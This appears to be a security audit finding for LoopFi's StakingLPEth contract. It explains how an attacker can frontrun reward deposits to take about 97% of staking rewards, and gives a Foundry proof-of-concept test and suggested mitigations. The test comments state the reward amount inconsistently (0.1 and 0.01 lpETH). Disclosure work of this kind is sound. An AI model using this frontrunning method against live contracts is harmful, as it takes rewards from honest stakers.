# Vulnerability details

## Vulnerability Details 
Users stake lpETH in the StakingLPEth contract to receive slpETH. slpETH is supposed to appreciate in value over time because a portion of the protocol's revenue from interest, flashloan fees, etc will be sent into the StakingLPEth contract.

The point of the StakingLPEth contract is to reward users that are currently staking lpETH. The issue is that an attacker can observe the mempool for the tx that involves sending the lpETH rewards to the StakingLPEth contract and frontrun it by staking to capture a significant % of the rewards and then immediately coolingdown/withdrawing the lpETH with profit.


## Proof of Concept
Add the following test `test__POC__FrontrunRewardsForProfit` to `StakingLP.t.sol`

Run it using `forge test --mt test__POC__FrontrunRewardsForProfit -vv`

```solidity
function test__POC__FrontrunRewardsForProfit() public {
        // setup attacker
        address attacker = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
        liquidityPool.transfer(attacker, 10 ether);
        vm.startPrank(attacker);
        liquidityPool.approve(address(stakingLpEth), 10 ether);
        uint256 attackersInitialLpEth = liquidityPool.balanceOf(attacker);

        // setup users
        vm.startPrank(user1);
        liquidityPool.approve(address(stakingLpEth), 0.1 ether);
        vm.startPrank(user2);
        liquidityPool.approve(address(stakingLpEth), 0.1 ether);
        vm.startPrank(user3);
        liquidityPool.approve(address(stakingLpEth), 0.1 ether);

        // honest users deposit into the stakingLpEth contract
        vm.startPrank(user1);
        stakingLpEth.deposit(0.1 ether, user1);
        vm.startPrank(user2);
        stakingLpEth.deposit(0.1 ether, user2);
        vm.startPrank(user3);
        stakingLpEth.deposit(0.1 ether, user3);

        // LoopFi sends a Tx to send in 0.1 lpETH as rewards into the stakingLpEth contract

        // The attacker was observing the mempool and he saw the incoming rewards Tx
        // so he frontruns it by depositing into the stakingLpEth contract
        vm.startPrank(attacker);
        stakingLpEth.deposit(10 ether, attacker);
        vm.stopPrank();

        // Now the rewards Tx goes through, for 0.1 lpETH
        _sendRewards();

        // Now the attacker will redeem all his shares for a profit
        vm.startPrank(attacker);
        stakingLpEth.redeem(stakingLpEth.balanceOf(attacker), attacker, attacker);


        // Calculate the lpETH profit
        uint256 attackersFinalLpEth = liquidityPool.balanceOf(attacker);
        uint256 attackerProfit = attackersFinalLpEth - attackersInitialLpEth;
        console.log("attackerProfit = %e", attackerProfit);
        assert(attackerProfit == 9.7087378640776699e16);

        // Since the rewards sent in was 0.01 lpETH, the attacker captured 97.1% of the rewards


        //NOTE: The test suite by LoopFi already set the cooldown duration == 0 in the setUp
        //      which is why in the POC the attacker could immediately withdraw the funds
        //      If it was > 0, the attacker will make the same profit but would have to wait
        //      the cooldown duration before withdrawing
    }
```

## Impact
Honest users staked in the pool will receive less rewards unfairly

Attacker will get a large profit at the expense of honest users staked in the pool

Note: This is medium severity because the attacker will likely have to wait for the cooldown period to end before withdrawing their all the funds with the profit BUT the code suggests that `cooldownDuration` will be set to == 0 in the future [proof here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L128) and [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L86). The test suite by LoopFi also purposely sets the cooldownDuration = 0 ([proof here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/test/unit/StakingLP.t.sol#L19)).

## Recommended Mitigation Steps
The best solution is to have a minimum staking period to be allocated rewards. 

Or implement a system where deposits sit in a queue for a few hours before they are actually deposited in the ERC4626 vault to accrue rewards
